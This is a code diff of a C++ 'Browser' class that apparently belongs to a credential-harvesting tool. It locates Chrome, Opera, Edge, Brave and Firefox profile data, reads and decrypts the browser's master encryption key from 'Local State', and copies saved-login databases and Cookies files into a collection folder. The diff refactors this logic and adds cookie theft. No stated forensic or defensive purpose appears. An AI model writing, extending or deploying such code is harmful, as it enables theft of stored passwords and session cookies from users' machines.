@@ -12,29 +12,40 @@
 
 /*				========================= Static Variables =========================				*/
 
+//const std::vector<std::string> Browser::relativePaths = {			// Relative Path to browser(s) data
+//	"/AppData/Local/Google/Chrome/User Data/Default/Login data",
+//	"/AppData/Local/Gogle/Chrome Beta/User Data/Default/Login data",
+//	"/AppData/Local/Chromium/User Data/Default/Login data",
+//	"/AppData/Local/Google/Chrome/User Data/Local State",
+//	"/AppData/Local/Google/Chrome Beta/User Data/Local State",
+//	"/AppData/Local/Chromium/User Data/Local State",
+//	"/AppData/Roaming/Opera Software/Opera Stable/Default/Login data",
+//	"/AppData/Roaming/Opera Software/Opera GX Stable/Default/Login data",
+//	"/AppData/Roaming/Opera Software/Opera Stable/Local State",
+//	"/AppData/Roaming/Opera Software/Opera GX Stable/Local State",
+//	"/AppData/Local/Microsoft/Edge/User Data/Default/Login data",
+//	"/AppData/Local/Microsoft/Edge/User Data/Local State",
+//	"/AppData/Roaming/Mozilla/Firefox/Profiles",
+//	"/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Login data",
+//	"/AppData/Local/BraveSoftware/Brave-Browser/User Data/Local State"
+//};
+
+
 const std::vector<std::string> Browser::relativePaths = {			// Relative Path to browser(s) data
-	"/AppData/Local/Google/Chrome/User Data/Default/Login data",
-	"/AppData/Local/Gogle/Chrome Beta/User Data/Default/Login data",
-	"/AppData/Local/Chromium/User Data/Default/Login data",
-	"/AppData/Local/Google/Chrome/User Data/Local State",
-	"/AppData/Local/Google/Chrome Beta/User Data/Local State",
-	"/AppData/Local/Chromium/User Data/Local State",
-	"/AppData/Roaming/Opera Software/Opera Stable/Default/Login data",
-	"/AppData/Roaming/Opera Software/Opera GX Stable/Default/Login data",
-	"/AppData/Roaming/Opera Software/Opera Stable/Local State",
-	"/AppData/Roaming/Opera Software/Opera GX Stable/Local State",
-	"/AppData/Local/Microsoft/Edge/User Data/Default/Login data",
-	"/AppData/Local/Microsoft/Edge/User Data/Local State",
+	"/AppData/Local/Google/Chrome/User Data/",
+	"/AppData/Roaming/Opera Software/",
+	"/AppData/Local/Microsoft/Edge/User Data/",
 	"/AppData/Roaming/Mozilla/Firefox/Profiles",
-	"/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Login data",
-	"/AppData/Local/BraveSoftware/Brave-Browser/User Data/Local State"
+	"/AppData/Local/BraveSoftware/Brave-Browser/User Data/"
 };
 
 const std::vector<std::string> Browser::impFiles = {	// List of important files to search/process [ Include all important files here ]
 					"logins.json",
 					"key4.db",
 					"cert9.db",
-					"cert8.db"
+					"cert8.db",
+					"Login Data",
+					"Cookies"
 };
 
 /*				========================= Private functions =========================				*/
@@ -57,32 +68,36 @@ bool Browser::isImportantFile(const std::string& path) {
 
 	if (path.empty()) {
 		std::cerr << __FUNCTIONW__ << "(): path is empty" << std::endl;
+		return false;
 	}
-	for (auto& file : Browser::impFiles) {
-		if (path.find(file) != std::string::npos) {
+	for (const auto& impFile : Browser::impFiles) {
+		const std::string fileName = extractFileNameFromPath(path);
+		if (fileName == impFile) {
 			return true;
 		}
 	}
 	return false;
 }
 
-void Browser::populateKeyAndStateFiles(const std::vector<std::string>& path) {
+std::string Browser::getKeyFilePath(const std::string& paths) {
 
-	for (unsigned int i = 0; i < path.size(); ++i) {
-		if (path[i].find("Login data") != std::string::npos) {
-			LoginDataPath.push_back(path[i]);
-		}
-		else if (path[i].find("Local State") != std::string::npos) {
-			EncryptedKeyPATH = path[i];
-		}
+	std::error_code error_code;
+	for (const auto& dirEntry : std::filesystem::recursive_directory_iterator(paths, std::filesystem::directory_options::skip_permission_denied, error_code)) {
+		if (std::filesystem::is_regular_file(dirEntry)) {
+			const std::string path{ dirEntry.path().string() };
+			if (path.find("Local State") != std::string::npos) {
+				return path;
+			}
+		}	
 	}
+	return std::string("");
 }
 
-std::string Browser::getEncryptedMasterKey(void) {
+std::string Browser::getEncryptedMasterKey(const std::string& keyFilePath) {
 
 	// EXTRACTION PROCESS STARTS FROM HERE
-	std::string PathToKey = EncryptedKeyPATH;
-	std::ifstream EncryptedKeyFile(PathToKey);
+	//std::string PathToKey = EncryptedKeyPATH;
+	std::ifstream EncryptedKeyFile(keyFilePath);
 	std::string KeyFile;
 
 	// Read the whole encrypted key file and store the content in "KeyFile"
@@ -128,10 +143,10 @@ std::string Browser::decryptMasterKey(const std::string& encryptedKey) {
 
 /*				========================= Public functions =========================				*/
 
-void Browser::ExtractKey(const std::vector<std::string> &path, const unsigned int &b64_key_length) {
+void Browser::ExtractKey(const std::string& browserPath, const unsigned int& b64_key_length) {
 
 	// Check whether the browser EXIST or NOT
-	if (path.empty()) {
+	if (browserPath.empty()) {
 		return;
 	}
 	if (b64_key_length == 0) {
@@ -139,10 +154,14 @@ void Browser::ExtractKey(const std::vector<std::string> &path, const unsigned in
 		return;
 	}
 	if (BrowserName.empty()) {
-		BrowserName = BrowserNameFinder(path[0]);
+		BrowserName = BrowserNameFinder(browserPath);
 	}
-	populateKeyAndStateFiles(path);
-	std::string encryptedMasterKey =  getEncryptedMasterKey();
+	std::string keyFilePath = getKeyFilePath(browserPath);
+	if (keyFilePath.empty()) {
+		std::cerr << "Couldn't find the encrypted key file for " << BrowserName << std::endl;
+		return;
+	}
+	std::string encryptedMasterKey = getEncryptedMasterKey(keyFilePath);
 	std::string masterAESKey = decryptMasterKey(encryptedMasterKey);
 	if (masterAESKey.empty()) {
 		std::cerr << "Couldn't extract masterKey for " << BrowserName << std::endl;
@@ -151,22 +170,22 @@ void Browser::ExtractKey(const std::vector<std::string> &path, const unsigned in
 	std::copy(masterAESKey.begin(), masterAESKey.end(), AES_KEY);
 }
 
-void Browser::ExtractFiles(const std::vector<std::string> &paths, const std::string &destinationDir) {
+void Browser::ExtractFiles(const std::string& browserPath, const std::string& destinationDir) {
 
-	if (paths.empty()) {
+	if (browserPath.empty()) {
 		std::cout << "Corresponding browser is not available" << std::endl;
 		return;
 	}
 	if (BrowserName.empty()) {
-		BrowserName = BrowserNameFinder(paths[0]);
+		BrowserName = BrowserNameFinder(browserPath);
 	}
 	const std::string DesDirPath = destinationDir + "/" + BrowserName + "/";
 	std::error_code error_code;
-	
+
 	// Create directory for the corresponding browser
 	std::filesystem::create_directories(DesDirPath, error_code);
 	if (error_code.value() != ERROR_SUCCESS) {
-		std::cerr <<__FUNCTION__ <<  "(): " << error_code.message() << std::endl;
+		std::cerr << __FUNCTION__ << "(): " << error_code.message() << std::endl;
 		return;
 	}
 
@@ -174,31 +193,17 @@ void Browser::ExtractFiles(const std::vector<std::string> &paths, const std::str
 	std::string filename;
 	std::vector<std::string> filesToBeCopied;
 
-	for (const auto& SrcFile : paths) {
-
-		if (BrowserName == "Firefox") {
-			std::string DirPath = paths[0];
-
-			for (const auto& dirEntry : std::filesystem::recursive_directory_iterator(DirPath, std::filesystem::directory_options::skip_permission_denied, error_code)) {
-				const std::string path{ dirEntry.path().string() };
-				if (isImportantFile(path)) {
-					filesToBeCopied.push_back(path);
-				}
-			}
-			for (const auto& filePath : filesToBeCopied) {
-				filename = extractFileNameFromPath(filePath);
-				std::filesystem::copy_file(filePath, DesDirPath + filename, error_code);
-				if (error_code.value() == ERROR_FILE_EXISTS) {
-					std::filesystem::copy_file(filePath, DesDirPath + filename + std::to_string(append_num++), error_code);
-				}
-			}
+	for (const auto& dirEntry : std::filesystem::recursive_directory_iterator(browserPath, std::filesystem::directory_options::skip_permission_denied, error_code)) {
+		const std::string path{ dirEntry.path().string() };
+		if (isImportantFile(path)) {
+			filesToBeCopied.push_back(path);
 		}
-		else if (SrcFile.find("Login data") != std::string::npos) {
-			filename = extractFileNameFromPath(SrcFile);
-			std::filesystem::copy_file(SrcFile, DesDirPath + filename, error_code);
-			if (error_code.value() == ERROR_FILE_EXISTS) {
-				std::filesystem::copy_file(SrcFile, DesDirPath + filename + std::to_string(append_num++), error_code);
-			}
+	}
+	for (const auto& filePath : filesToBeCopied) {
+		filename = extractFileNameFromPath(filePath);
+		std::filesystem::copy_file(filePath, DesDirPath + filename, error_code);
+		if (error_code.value() == ERROR_FILE_EXISTS) {
+			std::filesystem::copy_file(filePath, DesDirPath + filename + std::to_string(append_num++), error_code);
 		}
 	}
 }
